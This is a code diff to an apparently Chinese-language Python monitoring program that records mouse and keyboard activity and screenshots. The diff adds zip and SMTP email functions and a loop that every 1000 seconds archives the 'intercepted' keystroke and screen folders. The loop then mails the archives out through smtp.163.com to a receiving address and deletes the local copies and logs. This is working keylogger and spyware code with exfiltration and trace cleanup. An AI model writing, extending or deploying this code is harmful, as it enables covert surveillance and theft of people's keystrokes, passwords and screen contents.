@@ -1,4 +1,10 @@
-import time,os,re,sys,shutil,pickle
+import time,os,re,sys,shutil,pickle,zipfile
+import smtplib
+import email.mime.text
+import email.mime.multipart
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.application import MIMEApplication
 import multiprocessing as mp
 try:
     import psutil
@@ -32,6 +38,61 @@ try:
 except:
     pass
 
+def get_type_file(keyword='.txt'): # 这里可以更改扩展名如.doc,.py,.zip等等
+    # 打印当前的工作目录
+    print("当前目录为: ",os.getcwd())
+
+    # 列举当前工作目录下的文件名
+    files=os.listdir()
+    keyword=keyword
+    filelist=[]
+
+    i=0
+    for file in files:
+        if keyword in file:
+            i=i+1
+            print(i,file)
+            filelist.append(file)
+
+    return filelist
+
+def send_email(smtpHost,sendAddr,password,receiver,subject,content,filelist):
+    msg = MIMEMultipart()
+    msg['from'] = sendAddr
+    msg['to'] = receiver
+    msg['Subject'] = subject
+    txt = MIMEText(content, 'plain', 'utf-8')
+    msg.attach(txt)  # 添加邮件正文
+    # 添加附件,传送filelist列表里的文件
+    filename = ""
+    i = 0
+    for file in filelist:
+        i = i + 1
+        filename = file
+        # print(str(i),filename)
+        part = MIMEApplication(open(filename, 'rb').read())
+        part.add_header('Content-Disposition', 'attachment', filename=filename)
+        msg.attach(part)
+    server = smtplib.SMTP(smtpHost, 25)  # SMTP协议默认端口为25
+    # server.set_debuglevel(1)  # 出错时可以查看
+    server.login(sendAddr, password)
+    server.sendmail(sendAddr, receiver, str(msg))
+    #print("\n"+ str(len(filelist)) + "个文件发送成功")
+    server.quit()
+
+def createZip(filePath,saveName='test.zip'):
+    fileList=[]
+    newZip = zipfile.ZipFile(saveName,'w')
+    for dirpath,dirnames,filenames in os.walk(filePath):
+        for filename in filenames:
+            fileList.append(os.path.join(dirpath,filename))
+    for tar in fileList:
+        newZip.write(tar,tar[len(filePath):])
+    newZip.close()
+
+def unZip(filePath,unzipPath='',password=None):
+    file = zipfile.ZipFile(filePath)
+    file.extractall(unzipPath,pwd=password.encode("ascii"))
 
 def process(x):
     p=psutil.process_iter()
@@ -146,7 +207,7 @@ def scroll(x,y,dx,dy):
 
 def screen_jk():
     i=0
-    Max=1000
+    Max=200
     pro='explorer'
     while 1:
         a=process(pro)
@@ -234,6 +295,26 @@ def start_all():
     p2.start()
     p3.start()
     p4.start()
+    while 1:
+        time.sleep(1000)
+        createZip(r"d:\截获\鼠标键盘","IOstream.zip")
+        createZip(r"d:\截获\屏幕","Screen.zip")
+        try:
+            send_email('smtp.163.com','用于发送的邮箱','邮箱密码','用于接收的邮箱',"主题","正文内容",["IOstream.zip","Screen.zip"])
+            os.remove("IOstream.zip")
+            os.remove("Screen.zip")
+        except:
+            pass
+        try:
+            with open('%s鼠标.txt'%location3,'w') as f_obj:
+                f_obj.write('')
+        except:
+            pass
+        try:
+            with open('%s键盘.txt'%location3,'w') as f_obj:
+                f_obj.write('')
+        except:
+            pass
 
 if __name__ == '__main__':
     if not os.path.isfile('tj.zo'):
